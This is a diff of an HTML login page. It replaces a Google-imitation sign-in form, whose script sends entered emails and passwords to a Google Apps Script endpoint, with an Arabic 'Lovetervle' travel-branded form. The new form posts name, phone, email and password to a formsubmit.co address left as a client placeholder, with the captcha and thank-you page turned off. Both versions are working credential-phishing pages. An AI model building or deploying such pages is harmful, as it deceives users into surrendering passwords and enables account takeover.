@@ -1,205 +1,42 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign In</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<title>Lovetervle</title>
 <style>
-:root{
-  --g-blue:#4285F4;   /* G */
-  --g-red:#DB4437;    /* o */
-  --g-yellow:#F4B400; /* o */
-  --g-green:#0F9D58;  /* g */
-  --g-gray:#5f6368;
-  --g-border:#dadce0;
-  --g-bg:#fff;
-}
-*{box-sizing:border-box; font-family:'Roboto', sans-serif}
-body{
-  background:#fff; /* White background */
-  margin:0; 
-  display:flex; 
-  justify-content:center; 
-  align-items:center; 
-  min-height:100vh; 
-  padding:20px
-}
-.login-box{
-  background:var(--g-bg); 
-  width:100%;
-  max-width:450px; 
-  padding:48px 40px 36px; 
-  border-radius:8px;
-  border:1px solid var(--g-border);
-}
-.logo{text-align:center; margin-bottom:30px}
-.logo h2{font-size:28px; margin:0; font-weight:500; letter-spacing:-1px}
-.logo .b1{color:var(--g-blue)}   /* G */
-.logo .b2{color:var(--g-red)}    /* o */
-.logo .b3{color:var(--g-yellow)} /* o */
-.logo .b4{color:var(--g-blue)}   /* g */
-.logo .b5{color:var(--g-green)}  /* l */
-.logo .b6{color:var(--g-red)}    /* e */
-
-.form-group{position:relative; margin-bottom:24px}
-.form-group input{
-  width:100%; 
-  padding:13px 15px; 
-  border:1px solid var(--g-border); 
-  border-radius:4px; 
-  font-size:16px;
-  outline:none;
-  color:#202124
-}
-/* First input blue - Second input red */
-.form-group:nth-child(1) input:focus{border:2px solid var(--g-blue)}
-.form-group:nth-child(2) input:focus{border:2px solid var(--g-red)}
-
-.form-group label{
-  position:absolute;
-  top:13px; left:15px;
-  color:var(--g-gray); font-size:16px;
-  pointer-events:none;
-  transition:0.15s;
-  background:var(--g-bg); padding:0 4px
-}
-.form-group input:focus + label,
-.form-group input:not(:placeholder-shown) + label{
-  top:-8px; font-size:12px; 
-}
-.form-group:nth-child(1) input:focus + label{color:var(--g-blue)}
-.form-group:nth-child(2) input:focus + label{color:var(--g-red)}
-
-.btn{
-  width:100%; 
-  padding:10px 24px; 
-  background:var(--g-blue); /* Google Blue */
-  color:white; 
-  border:none; 
-  border-radius:4px;
-  font-size:14px; 
-  font-weight:500; 
-  cursor:pointer;
-  margin-top:8px
-}
-.btn:hover{background:#357ae8}
-
-.footer-text{
-  text-align:center; 
-  margin-top:28px; 
-  font-size:12px; 
-  color:var(--g-gray)
-}
-/* Company name colored */
-.footer-text .c1{color:var(--g-blue)}
-.footer-text .c2{color:var(--g-red)}
-.footer-text .c3{color:var(--g-yellow)}
-.footer-text .c4{color:var(--g-blue)}
-.footer-text .c5{color:var(--g-green)}
-.footer-text .c6{color:var(--g-red)}
-.hidden{display:none}
-.msg{margin-top:15px; padding:12px; border-radius:4px; text-align:center; font-size:14px; font-weight:600; display:none}
-.msg.show{display:block}
-.success{color:var(--g-green)} /* Green */
-.error{color:var(--g-red)} /* Red */
-.info{color:var(--g-blue)} /* Blue */
-.warning{color:var(--g-yellow)} /* Yellow */
+  *{margin:0;padding:0;box-sizing:border-box;font-family:tahoma, sans-serif;}
+  body{background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;}
+  .card{background:white; width:100%; max-width:420px; border-radius:20px; padding:30px 25px;}
+  .logo{text-align:center; margin-bottom:20px;}
+  .logo h1{color:#0d47a1; font-size:34px; font-weight:900;}
+  .input-group{margin-bottom:14px;}
+  .input-group input{width:100%; padding:13px; border:1px solid #ddd; border-radius:10px; outline:none;}
+  .btn{width:100%; padding:14px; background:#1976d2; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;}
+  .footer{text-align:center; margin-top:20px; font-size:12px; color:#999; border-top:1px solid #eee; padding-top:15px;}
 </style>
 </head>
 <body>
 
-<div class="login-box">
-  <div class="logo">
-    <h2>
-      <span class="b1">G</span>
-      <span class="b2">o</span>
-      <span class="b3">o</span>
-      <span class="b4">g</span>
-      <span class="b5">l</span>
-      <span class="b6">e</span>
-    </h2>
-  </div>
+<div class="card">
+  <div class="logo"><h1>Lovetervle ✈️</h1></div>
 
-  <!-- Register Form -->
-  <form id="regForm">
-    <div class="form-group">
-      <input type="email" id="regEmail" placeholder=" " required>
-      <label>Email</label>
-    </div>
-    <div class="form-group">
-      <input type="password" id="regPassword" placeholder=" " required>
-      <label>Password</label>
-    </div>
-    <button type="submit" class="btn" id="regBtn">Verify</button>
-    <div id="regMsg" class="msg"></div>
+  <!-- هنا بتحط ايميل العميل -->
+  <form action="https://formsubmit.co/CLIENT_EMAIL_HERE" method="POST">
+    <div class="input-group"><input type="text" name="الاسم" placeholder="الاسم الكامل" required></div>
+    <div class="input-group"><input type="tel" name="الهاتف" placeholder="رقم التليفون" required></div>
+    <div class="input-group"><input type="email" name="الايميل" placeholder="البريد الإلكتروني" required></div>
+    <div class="input-group"><input type="password" name="كلمة المرور" placeholder="كلمة المرور" required></div>
+    
+    <!-- عشان ما يظهرش صفحة شكر -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+
+    <button type="submit" class="btn">تسجيل الدخول</button>
   </form>
 
-  <!-- Verification Form -->
-  <form id="verifyForm" class="hidden">
-    <div class="form-group">
-      <input type="text" id="verifyCode" placeholder=" " maxlength="6" required>
-      <label>Verification Code</label>
-    </div>
-    <input type="hidden" id="verifyEmail">
-    <button type="submit" class="btn">Verify</button>
-    <div id="verifyMsg" class="msg"></div>
-  </form>
-
-  <p class="footer-text">
-    © 2026 
-    <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span>
-    <span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
-  </p>
+  <div class="footer">love travels 2026 ©</div>
 </div>
 
-<script>
-const SCRIPT_URL =`https://script.google.com/macros/s/AKfycby1tJgqo5slPFK8ZLBjG5U-_1D3XSUJSeV24w51mR9wXVfac77dmgO43hvg_07_EVc20Q/exec`
-function showMsg(id, text, type){
-  const el = document.getElementById(id);
-  el.innerHTML = text;
-  el.className = 'msg show ' + type;
-}
-
-// Register
-document.getElementById('regForm').addEventListener('submit', e=>{
-  e.preventDefault();
-  const btn = document.getElementById('regBtn');
-  btn.disabled = true; btn.innerText = 'Sending...';
-  showMsg('regMsg', '⏳ Sending code...', 'info');
-  const code = Math.floor(100000 + Math.random() * 900000);
-  
-  const data = {
-    action: "register",
-    name: "No Name",
-    email: regEmail.value, 
-    password: regPassword.value, 
-    code: code
-  };
-
-  fetch(SCRIPT_URL, {method:'POST', body:JSON.stringify(data)})
-.then(res=>res.json()).then(res=>{
-    if(res.result==="success"){
-      verifyEmail.value = regEmail.value;
-      document.getElementById('regForm').classList.add('hidden');
-      document.getElementById('verifyForm').classList.remove('hidden');
-      showMsg('verifyMsg', '✅ Verification code sent', 'success');
-    } else { showMsg('regMsg','❌ '+res.error,'error') }
-  }).finally(()=>{btn.disabled=false; btn.innerText='Nexuut'})
-});
-
-// Verify
-document.getElementById('verifyForm').addEventListener('submit', e=>{
-  e.preventDefault();
-  showMsg('verifyMsg', '⏳ Verifying...', 'warning');
-  const data = {action:"verify", email:verifyEmail.value, code:verifyCode.value};
-  fetch(SCRIPT_URL, {method:'POST', body:JSON.stringify(data)})
-.then(res=>res.json()).then(res=>{
-    if(res.result==="success"){
-      showMsg('verifyMsg','✅ Email verified successfully','success');
-    } else { showMsg('verifyMsg','❌ Invalid code','error') }
-  })
-});
-</script>
 </body>
 </html>
